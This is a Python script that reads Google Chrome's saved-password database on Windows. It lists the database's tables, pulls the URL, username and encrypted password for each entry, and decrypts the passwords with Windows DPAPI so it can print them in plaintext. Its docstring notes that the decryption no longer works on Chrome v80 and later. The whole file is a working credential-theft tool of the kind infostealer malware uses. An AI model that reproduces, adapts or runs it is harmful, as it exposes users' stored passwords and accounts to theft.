"""
This script connects to Google Chrome's 'Login Data' database to extract saved login credentials.
It performs reconnaissance on the database structure, retrieves login data, and decrypts passwords
using Windows DPAPI. Decryption method is obsolete on versions of Chrome v80+

Functions:
    - recon: Performs reconnaissance on the database to identify tables and columns.
    - fetch_login_data: Fetches login data (URL, username, encrypted password) without decryption.
    - decrypt_password: Decrypts an encrypted password using Windows DPAPI.
    - fetch_login_data_with_decryption: Fetches and decrypts login data, displaying URLs, usernames, and plaintext passwords.

Usage:
    The script first checks for the existence of Chrome's 'Login Data' file. If found, it connects
    to the SQLite database and performs reconnaissance to identify table structure. It then
    retrieves and decrypts login data, displaying the decrypted usernames and passwords for each
    saved login entry.

Requirements:
    - pywin32: Provides access to Windows DPAPI for decrypting the passwords.

Note:
    Decryption will only work on the same system and user profile where Chrome's data was originally
    saved, as DPAPI ties decryption to the specific user and machine.
    For privacy concerns, appropriate permissions should be given to access and decrypt this data.
"""

import sqlite3
import os
import win32crypt

def recon(pointer) -> None:
    # Find tables
    pointer.execute("SELECT name FROM sqlite_master WHERE type='table'")
    print("Tables:", pointer.fetchall())

    # Check the columns in the 'logins' table
    pointer.execute('PRAGMA table_info(logins)')
    columns = [row[1] for row in pointer.fetchall()]
    print("Columns in 'logins' table:", columns)

def fetch_login_data(pointer):
    pointer.execute("SELECT action_url, username_value, password_value FROM logins")
    for row in pointer.fetchall():
        print("URL:", row[0])
        print("Username:", row[1])
        print("Encrypted Password:", row[2])  # Password will be encrypted
        print("-" * 40)

def decrypt_password(encrypted_password):
    # Decrypt the password using Windows DPAPI
    decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
    return decrypted_password.decode('utf-8') if decrypted_password else None

def fetch_login_data_with_decryption(pointer):
    pointer.execute("SELECT action_url, username_value, password_value FROM logins")
    for row in pointer.fetchall():
        url = row[0]
        username = row[1]
        encrypted_password = row[2]

        # Decrypt the password
        decrypted_password = decrypt_password(encrypted_password)

        print("URL:", url)
        print("Username:", username)
        print("Password:", decrypted_password)
        print("-" * 40)

# Path to Chrome's Login Data file
login_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data")

# Connect to the database and execute functions
if os.path.exists(login_path):
    conn = sqlite3.connect(login_path)
    cursor = conn.cursor()

    # Recon: Discover database structure
    recon(cursor)

    # Fetch and display login data
    fetch_login_data_with_decryption(cursor)

    # Close the database connection
    conn.close()
else:
    print("Chrome Login Data file not found.")
